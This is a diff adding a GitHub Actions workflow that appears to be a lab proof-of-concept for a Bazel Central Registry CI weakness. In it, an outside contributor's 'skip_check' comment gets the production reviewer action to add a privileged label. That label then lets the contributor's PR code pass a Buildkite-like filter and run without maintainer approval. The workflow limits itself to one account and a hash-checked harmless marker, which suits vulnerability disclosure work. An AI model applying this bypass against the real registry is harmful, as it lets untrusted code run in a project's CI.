@@ -1,0 +1,280 @@
+name: LAB - Outsider skip_check PoC
+
+on:
+  issue_comment:
+    types: [created, edited]
+
+permissions:
+  contents: read
+
+jobs:
+  production-skip-check:
+    # LAB SAFETY:
+    # Only account 2 is allowed to trigger this reproduction.
+    if: >-
+      github.repository == 'SwayZGl1tZyyy/bazel-central-registry' &&
+      github.event.issue.pull_request &&
+      github.event.comment.user.login == 'SwayZGl1tZyy' &&
+      startsWith(github.event.comment.body, '@bazel-io skip_check ')
+
+    runs-on: ubuntu-latest
+
+    permissions:
+      contents: read
+      issues: write
+      pull-requests: read
+
+    steps:
+      - name: Verify external commenter and PR
+        env:
+          GH_TOKEN: ${{ github.token }}
+          EXPECTED_COMMENTER: SwayZGl1tZyy
+          EXPECTED_COMMENTER_ID: "324844509"
+          EXPECTED_HEAD_REPO: SwayZGl1tZyy/bazel-central-registry
+        shell: bash
+        run: |
+          set +e
+
+          echo "=================================================="
+          echo "EXTERNAL ACTOR"
+          echo "=================================================="
+          echo "commenter login: ${{ github.event.comment.user.login }}"
+          echo "commenter id:    ${{ github.event.comment.user.id }}"
+          echo "association:     ${{ github.event.comment.author_association }}"
+          echo "PR number:       ${{ github.event.issue.number }}"
+          echo "comment:         ${{ github.event.comment.body }}"
+
+          FAIL=0
+
+          if [ "${{ github.event.comment.user.login }}" != "$EXPECTED_COMMENTER" ]; then
+            echo "[-] wrong commenter login"
+            FAIL=1
+          fi
+
+          if [ "${{ github.event.comment.user.id }}" != "$EXPECTED_COMMENTER_ID" ]; then
+            echo "[-] wrong commenter id"
+            FAIL=1
+          fi
+
+          PR_JSON="$(
+            gh api \
+              "repos/$GITHUB_REPOSITORY/pulls/${{ github.event.issue.number }}"
+          )"
+
+          HEAD_REPO="$(printf '%s' "$PR_JSON" | jq -r '.head.repo.full_name')"
+          HEAD_OWNER_ID="$(printf '%s' "$PR_JSON" | jq -r '.head.repo.owner.id')"
+          PR_AUTHOR="$(printf '%s' "$PR_JSON" | jq -r '.user.login')"
+          HEAD_SHA="$(printf '%s' "$PR_JSON" | jq -r '.head.sha')"
+
+          echo
+          echo "PR author:       $PR_AUTHOR"
+          echo "PR head repo:    $HEAD_REPO"
+          echo "PR head ownerid: $HEAD_OWNER_ID"
+          echo "PR head SHA:     $HEAD_SHA"
+
+          if [ "$HEAD_REPO" != "$EXPECTED_HEAD_REPO" ]; then
+            echo "[-] PR is not from account 2's fork"
+            FAIL=1
+          fi
+
+          if [ "$HEAD_OWNER_ID" != "$EXPECTED_COMMENTER_ID" ]; then
+            echo "[-] PR fork owner id mismatch"
+            FAIL=1
+          fi
+
+          if [ "$PR_AUTHOR" != "$EXPECTED_COMMENTER" ]; then
+            echo "[-] PR author is not account 2"
+            FAIL=1
+          fi
+
+          if [ "$FAIL" != "0" ]; then
+            exit 1
+          fi
+
+          echo
+          echo "[+] ordinary external contributor confirmed"
+
+      # Exact production action and exact production pin.
+      #
+      # Production uses BCR_PR_REVIEW_HELPER_TOKEN.
+      # The controlled fork uses github.token only because the production
+      # secret is not present here. No skip_check authorization logic is
+      # patched or replaced.
+      - name: Run exact production skip_check action
+        uses: bazelbuild/continuous-integration/actions/bcr-pr-reviewer@957b0ac44549a70ccb951361b804d07d955aeb79
+        with:
+          token: ${{ github.token }}
+          action-type: skip_check
+
+      - name: Verify privileged label was created
+        env:
+          GH_TOKEN: ${{ github.token }}
+        shell: bash
+        run: |
+          set +e
+
+          echo
+          echo "=================================================="
+          echo "LABEL STATE AFTER PRODUCTION ACTION"
+          echo "=================================================="
+
+          LABELS="$(
+            gh api \
+              "repos/$GITHUB_REPOSITORY/issues/${{ github.event.issue.number }}" \
+              --jq '.labels[].name'
+          )"
+
+          printf '%s\n' "$LABELS"
+
+          if ! printf '%s\n' "$LABELS" |
+               grep -Fxq "skip-url-stability-check"; then
+            echo "[-] production skip_check action did not add expected label"
+            exit 1
+          fi
+
+          echo
+          echo "[+] skip-url-stability-check exists"
+          echo "[+] commenter was account 2, not a module/BCR maintainer"
+
+  simulate-production-buildkite-filter:
+    needs: production-skip-check
+    runs-on: ubuntu-latest
+
+    # IMPORTANT:
+    # This job is intentionally read-only and contains no secrets.
+    permissions:
+      contents: read
+      issues: read
+      pull-requests: read
+
+    steps:
+      - name: Evaluate production-equivalent label condition
+        id: pr
+        env:
+          GH_TOKEN: ${{ github.token }}
+          EXPECTED_HEAD_REPO: SwayZGl1tZyy/bazel-central-registry
+          EXPECTED_HEAD_OWNER_ID: "324844509"
+        shell: bash
+        run: |
+          set +e
+
+          PR="${{ github.event.issue.number }}"
+
+          PR_JSON="$(
+            gh api "repos/$GITHUB_REPOSITORY/pulls/$PR"
+          )"
+
+          HEAD_REPO="$(printf '%s' "$PR_JSON" | jq -r '.head.repo.full_name')"
+          HEAD_SHA="$(printf '%s' "$PR_JSON" | jq -r '.head.sha')"
+          HEAD_REF="$(printf '%s' "$PR_JSON" | jq -r '.head.ref')"
+          HEAD_OWNER_ID="$(printf '%s' "$PR_JSON" | jq -r '.head.repo.owner.id')"
+
+          LABELS="$(
+            gh api \
+              "repos/$GITHUB_REPOSITORY/issues/$PR" \
+              --jq '.labels[].name'
+          )"
+
+          echo "head repo: $HEAD_REPO"
+          echo "head ref:  $HEAD_REF"
+          echo "head sha:  $HEAD_SHA"
+
+          echo
+          echo "labels:"
+          printf '%s\n' "$LABELS"
+
+          if [ "$HEAD_REPO" != "$EXPECTED_HEAD_REPO" ]; then
+            echo "[-] unexpected fork"
+            exit 1
+          fi
+
+          if [ "$HEAD_OWNER_ID" != "$EXPECTED_HEAD_OWNER_ID" ]; then
+            echo "[-] unexpected fork owner id"
+            exit 1
+          fi
+
+          # This mirrors the relevant production Buildkite condition:
+          #
+          # (labels includes "skip-url-stability-check")
+          # OR
+          # (labels includes "presubmit-auto-run")
+          #
+          if printf '%s\n' "$LABELS" |
+               grep -Fxq "skip-url-stability-check"; then
+
+            echo
+            echo "[+] PRODUCTION-EQUIVALENT FILTER = TRUE"
+            echo "[+] reason: skip-url-stability-check"
+          else
+            echo "[-] production-equivalent filter is false"
+            exit 1
+          fi
+
+          {
+            echo "head_repo=$HEAD_REPO"
+            echo "head_sha=$HEAD_SHA"
+            echo "head_ref=$HEAD_REF"
+          } >> "$GITHUB_OUTPUT"
+
+      - name: Checkout external PR HEAD
+        uses: actions/checkout@v7
+        with:
+          repository: ${{ steps.pr.outputs.head_repo }}
+          ref: ${{ steps.pr.outputs.head_sha }}
+          persist-credentials: false
+
+      - name: Verify safe PoC marker
+        shell: bash
+        run: |
+          set +e
+
+          EXPECTED="0ae479371417e0ee71ab5fc3caa4ce0999c839262b40fcc976e20b7c9bf4b354"
+
+          if [ ! -f .lab/outsider-marker.sh ]; then
+            echo "[-] expected marker does not exist"
+            exit 1
+          fi
+
+          ACTUAL="$(
+            sha256sum .lab/outsider-marker.sh |
+            awk '{print $1}'
+          )"
+
+          echo "expected marker SHA256: $EXPECTED"
+          echo "actual marker SHA256:   $ACTUAL"
+
+          if [ "$ACTUAL" != "$EXPECTED" ]; then
+            echo "[-] refusing to execute unexpected PR code"
+            exit 1
+          fi
+
+          echo
+          echo "Marker content:"
+          cat .lab/outsider-marker.sh
+
+          echo
+          echo "[+] marker exactly matches safe lab payload"
+
+      - name: Execute external PR marker
+        shell: bash
+        run: |
+          set +e
+
+          echo "=================================================="
+          echo "EXTERNAL PR HEAD EXECUTION"
+          echo "=================================================="
+
+          bash .lab/outsider-marker.sh
+
+          RC=$?
+
+          echo
+          echo "marker rc=$RC"
+
+          if [ "$RC" != "0" ]; then
+            exit 1
+          fi
+
+          echo
+          echo "[+] CODE FROM EXTERNAL PR HEAD EXECUTED"
+          echo "[+] NO MAINTAINER APPROVAL WAS USED BY THIS LAB FLOW"
